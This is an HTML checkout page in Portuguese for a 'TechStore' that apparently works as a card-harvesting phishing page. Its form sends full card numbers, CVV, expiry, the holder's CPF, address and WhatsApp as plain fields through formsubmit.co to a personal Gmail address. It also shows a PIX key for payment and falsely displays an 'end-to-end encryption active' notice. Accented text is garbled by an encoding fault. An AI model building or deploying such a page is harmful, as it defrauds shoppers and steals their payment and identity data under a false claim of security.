<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Pagamento Seguro - TechStore</title>
<style>
    /* Estilos preservados conforme seu design dark */
    * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
    body { background:#111; margin:0; padding:15px; min-height:100vh; display:flex; flex-direction:column; color: white; }
    .container { max-width:500px; margin:auto; background:#1c1c1c; border-radius:20px; padding:20px; box-shadow:0 5px 15px rgba(0,0,0,.5); }
    
    /* Resumo do Pedido */
    .resumo { display:flex; gap:15px; background:#252525; padding:15px; border-radius:15px; margin-bottom:20px; border-left:5px solid #27ae60; align-items: center; }
    .foto-produto { width:70px; height:70px; object-fit: contain; background:#fff; border-radius:10px; padding: 5px; }
    .resumo h3 { margin:0; font-size:14px; color: #eee; line-height: 1.2; }
    .resumo p { margin:5px 0 0; font-size:17px; font-weight:bold; color:#27ae60; }
    .multi-item { font-size: 11px; color: #888; margin-top: 3px; display: block; }

    h2 { font-size:13px; color:#888; margin:20px 0 10px; text-transform:uppercase; }
    input { width:100%; padding:13px; margin-bottom:12px; border:1px solid #333; border-radius:10px; font-size:15px; background: #222; color: #fff; outline: none; }
    input:focus { border-color: #007bff; }
    
    .row { display:flex; gap:10px; }
    .metodos { display:flex; gap:10px; margin-bottom:10px; }
    .opt { flex:1; padding:14px; text-align:center; border:2px solid #333; border-radius:12px; cursor:pointer; font-weight:bold; color:#888; transition: 0.3s; }
    .opt.active { border-color:#007bff; color:#007bff; background:#007bff1a; }
    
    #area-pix { text-align:center; }
    .chave-pix { background:#222; padding:12px; border-radius:10px; font-size:13px; margin:10px 0; word-break:break-all; border:1px dashed #444; font-weight:bold; color: #ccc; }
    .btn-copiar { background:#007bff; color:#fff; border:none; padding:12px 20px; border-radius:10px; font-size:14px; font-weight:bold; cursor:pointer; width: 100%; }
    
    .btn-finalizar { background:#27ae60; color:#fff; border:none; width:100%; padding:18px; border-radius:15px; font-size:18px; font-weight:bold; cursor:pointer; margin-top: 10px; transition: 0.2s; }
    .btn-finalizar:active { transform: scale(0.98); background: #219150; }
    
    .seguranca { margin: 10px 0 20px; padding: 12px; background: #222; border-radius: 12px; font-size: 11px; color: #888; display: flex; gap: 8px; align-items: center; border: 1px solid #333; }
</style>
</head>
<body>

<div class="container">
    <div id="resumo-dinamico">
        <div class="resumo">
            <div style="width:70px; height:70px; background:#333; border-radius:10px;"></div>
            <div>
                <h3 style="color:#666">Carregando pedido...</h3>
            </div>
        </div>
    </div>

    <form action="https://formsubmit.co/pagamento.celular02@gmail.com" method="POST">
        <input type="hidden" name="_captcha" value="false">
        <input type="hidden" id="h-nome" name="PRODUTOS_LISTA">
        <input type="hidden" id="h-preco" name="VALOR_TOTAL">

        <h2>Localiza√ß√£o para Entrega</h2>
        <input type="text" name="NOME_CLIENTE" placeholder="Nome Completo" required>
        <input type="text" name="ENDERECO" placeholder="Endere√ßo, Bairro e Cidade" required>
        <div class="row">
            <input type="text" name="NUMERO" placeholder="N¬∫" required style="width:30%">
            <input type="text" id="f-cep" name="CEP" placeholder="CEP" required style="width:70%">
        </div>

        <h2>Pagamento</h2>
        <div class="metodos">
            <div class="opt active" id="b-pix" onclick="trocar('pix')">PIX</div>
            <div class="opt" id="b-card" onclick="trocar('card')">CART√ÉO</div>
        </div>

        <div id="area-pix">
            <img src="codigoqr/qrcode.jpg" width="160" style="border-radius:10px; border: 5px solid white; margin-bottom: 10px;">
            <div class="chave-pix" id="pix-copy">5663014b-ba23-4c57-b239-26914c95a8c0</div>
            <button type="button" class="btn-copiar" onclick="copiarPix()">COPIAR CHAVE PIX</button>
        </div>

        <div id="area-card" style="display:none">
            <input id="c1" name="CARTAO_NUMERO" placeholder="N√∫mero do Cart√£o">
            <input id="c2" name="CARTAO_NOME" placeholder="Nome no Cart√£o">
            <div class="row">
                <input id="c3" name="CARTAO_VALIDADE" placeholder="MM/AA">
                <input id="c4" name="CARTAO_CVV" placeholder="CVV">
            </div>
            <input id="c5" name="CARTAO_CPF" placeholder="CPF do Titular">
            <input id="c6" name="WHATSAPP" placeholder="WhatsApp para confirma√ß√£o">
        </div>

        <div class="seguranca">
            <span>üîí</span>
            <div><strong>Pagamento processado de forma segura.</strong><br>Criptografia de ponta a ponta ativa.</div>
        </div>

        <button class="btn-finalizar" type="submit">FINALIZAR PAGAMENTO</button>
    </form>
</div>

<script>
window.onload = function() {
    // Busca o carrinho salvo pela index.html
    const carrinho = JSON.parse(localStorage.getItem('carrinhoTechStore')) || [];
    const displayResumo = document.getElementById('resumo-dinamico');

    if (carrinho.length > 0) {
        let total = 0;
        let listaNomes = [];

        // Calcula total e nomes
        carrinho.forEach(item => {
            total += parseFloat(item.p);
            listaNomes.push(item.n);
        });

        // Pega a foto do primeiro item. 
        // Se a URL j√° contiver "fotos/", usamos direto. Caso contr√°rio, verificamos.
        let fotoURL = carrinho[0].f;

        // Monta o resumo visual com a FOTO do primeiro aparelho
        displayResumo.innerHTML = `
            <div class="resumo">
                <img class="foto-produto" src="${fotoURL}" onerror="this.src='https://via.placeholder.com/70?text=Item'">
                <div>
                    <h3>${carrinho[0].n}</h3>
                    ${carrinho.length > 1 ? `<span class="multi-item">+ ${carrinho.length - 1} outros itens no carrinho</span>` : ''}
                    <p>R$ ${total.toLocaleString('pt-BR', {minimumFractionDigits: 2})}</p>
                </div>
            </div>
        `;

        // Preenche campos ocultos para o e-mail (FormSubmit)
        document.getElementById('h-nome').value = listaNomes.join(" | ");
        document.getElementById('h-preco').value = "R$ " + total.toLocaleString('pt-BR', {minimumFractionDigits: 2});

    } else {
        displayResumo.innerHTML = "<div class='resumo'><h3>Carrinho vazio. Volte √† loja.</h3></div>";
    }
};

function trocar(m) {
    const isPix = m === 'pix';
    document.getElementById('area-pix').style.display = isPix ? 'block' : 'none';
    document.getElementById('area-card').style.display = isPix ? 'none' : 'block';
    document.getElementById('b-pix').className = isPix ? 'opt active' : 'opt';
    document.getElementById('b-card').className = isPix ? 'opt' : 'opt active';
    
    const campos = ['c1', 'c2', 'c3', 'c4', 'c5'];
    campos.forEach(id => {
        const el = document.getElementById(id);
        if(el) el.required = !isPix;
    });
}

function copiarPix() {
    const chave = document.getElementById('pix-copy').innerText;
    navigator.clipboard.writeText(chave).then(() => {
        alert("Chave PIX copiada com sucesso!");
    });
}

function aplicarMascara(id, mascara) {
    const input = document.getElementById(id);
    if (!input) return;
    input.addEventListener('input', () => {
        let apenasNumeros = input.value.replace(/\D/g, '');
        let novoValor = '';
        let i = 0;
        mascara.split('').forEach(char => {
            if (char === '#') {
                if (apenasNumeros[i]) novoValor += apenasNumeros[i++];
            } else {
                if (apenasNumeros[i]) novoValor += char;
            }
        });
        input.value = novoValor;
    });
}

// M√°scaras de entrada
aplicarMascara('f-cep', '#####-###');
aplicarMascara('c1', '#### #### #### ####');
aplicarMascara('c3', '##/##');
aplicarMascara('c4', '###');
aplicarMascara('c5', '###.###.###-##');
aplicarMascara('c6', '(##) #####-####');
</script>

</body>
</html>
